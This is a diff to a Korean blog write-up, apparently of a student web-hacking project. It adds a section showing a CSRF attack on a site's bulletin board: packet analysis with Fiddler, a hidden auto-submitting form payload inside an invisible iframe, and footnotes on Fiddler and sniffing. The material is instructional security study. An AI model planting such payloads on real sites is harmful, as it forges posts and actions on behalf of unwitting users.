@@ -332,6 +332,70 @@ XSS 공격이 가능한것이 확인이 되어, 전 XSS 공격으로 `쿠키값`
 
 이번에도 `게시판`을 통해 `CSRF` 공격이 가능한지 확인해보겠습니다.
 
+<br>
+
+<figure>
+<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbxVhRr%2FbtrdVPlGK5Z%2FG59Lv2gPNdTIIkPTyglQpk%2Fimg.png
+" alt="Weather API Web Sites - Main">
+<figcaption>Fig 18. 게시글 패킷 분석 (1/3)</figcaption>
+</figure>
+<figure>
+<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F15Zjf%2Fbtrd0XQw9r0%2FJtuLiwvfqqTBOOtY587gkK%2Fimg.png
+" alt="Weather API Web Sites - Main">
+<figcaption>Fig 19. 게시글 패킷 분석 (2/3)</figcaption>
+</figure>
+<figure>
+<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FsaO9N%2FbtrdU7fQQUU%2FVTQ6Aj0CaiHgdslA9sTL3K%2Fimg.png
+" alt="Weather API Web Sites - Main">
+<figcaption>Fig 20. 게시글 패킷 분석 (3/3)</figcaption>
+</figure>
+<figure>
+<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FrQLTg%2Fbtrd1PYL6CG%2FlK74dFguapKV2iHcnq6GGK%2Fimg.png
+" alt="Weather API Web Sites - Main">
+<figcaption>Fig 21. CSRF 공격 (1/5)</figcaption>
+</figure>
+<figure>
+<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdEShRj%2Fbtrd0FP2nhS%2FDKe5Ym570B6kmEXkyCJgZ1%2Fimg.png
+" alt="Weather API Web Sites - Main">
+<figcaption>Fig 22. CSRF 공격 (2/5)</figcaption>
+</figure>
+
+<figure>
+<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbTqeo6%2FbtrdZWY3t4y%2Fh8vhOpqTHDNuqqEaxFKrr1%2Fimg.png
+" alt="Weather API Web Sites - Main">
+<figcaption>Fig 23. CSRF 공격 (3/5)</figcaption>
+</figure>
+
+<figure>
+<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FnjcZj%2Fbtrd0j7DLvl%2F9l6bh7yhypvQneq2pgAYU0%2Fimg.png
+" alt="Weather API Web Sites - Main">
+<figcaption>Fig 24. CSRF 공격 (4/5)</figcaption>
+</figure>
+
+
+<figure>
+<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fcfzeit%2Fbtrd0yQ1pbK%2FprkYS2kdkltrIsvTN8xX0K%2Fimg.png
+" alt="Weather API Web Sites - Main">
+<figcaption>Fig 25. CSRF 공격 (5/5)</figcaption>
+</figure>
+
+```php
+<form name="write_form" action="write_ok.php" method="post" enctype="multipart/form-data" target="A">
+<input type="hidden" name="title" value="CSRF 자동 글"> 
+<input type="hidden" name="content" value="test">
+<input type="hidden" name="lockpost" value="1" >
+<input type="file" name="imgFile" style="display:none;"> 
+</form>
+<iframe name="A" style="display:none;"></iframe> 
+<script>document.write_form.submit();</script>
+```
+<figcaption>CSRF 공격 코드</figcaption>
+
+정상적인 게시글을 작성 후 <sup id="fiddler">[[5]](#user-ref5)</sup>`fiddler`로 글쓰기가 어떠한 방식으로 작성이 되었는지 <br><sup id="sniffing">[[6]](#user-ref6)</sup>`스니핑` 한 후 탈취한 `파라미터와 변수`를 위에 CSRF 공격 코드처럼 양식을 맞추어 작성 후 게시글을 등록합니다. 그다음 다른 계정으로 작성한 게시글(CSRF를 코드가 주입된 게시글)를 읽으면 사이트 간 `요청 위조`를 하였기 때문에 내가 작성한 글이 아님에도 해커에 의해서 `의도치 않은` 글을 작성하게 됩니다. (* input type="file"은 hidden이 안먹히므로 style에 따로 display:none;를 이용하여 스타일링 해주었습니다.)
+
+
+
+
 <hr>
 
 # 4. 프로젝트 결과
@@ -358,6 +422,13 @@ limit 함수는 문자열의 길이를 반환한다. 문장열의 길이를 알�
 <small id="user-ref4"><sup>[[4]](#csrf)</sup> 정의만 보면 앞서 알아봤던 XSS와 SQL injection과 비슷하다.
 <br>XSS가 사용자가 특정 사이트를 신뢰한다는 점을 공격하는거라면, CSRF는 특정 사이트가 사용자의 브라우저를 신뢰한다는 점을 공격하는 것이 다르다.
 <br>간단하게 정리하자면, 악성코드가 XSS: 클라이언트에서 발생 / CSRF: 서버에서 발생이라고 할 수 있다.</small>
+<br>
+<br>
+<small id="user-ref5"><sup>[[5]](#fiddler)</sup> Fiddler 는 컴퓨터와 웹 서버 또는 서버 간의 HTTP 및 HTTPS 트래픽 을 기록, 검사 및 변경하는 데 사용되는 디버깅 프록시 서버 도구 입니다.</small>
+<br>
+<br>
+<small id="user-ref6"><sup>[[6]](#sniffing)</sup> Sniffing의 사전적 의미는 코를 킁킁거리다, 냄새를 맡다 등의 뜻이 존재한다.<br>
+자신이 아닌상대방들의 패킷이 통신망에 돌아다니는 데이터를 몰래 도청하는 행위이다.  정보자산의 기밀성을 저해한다.</small>
 <hr>
 
 # 6. 참고자료
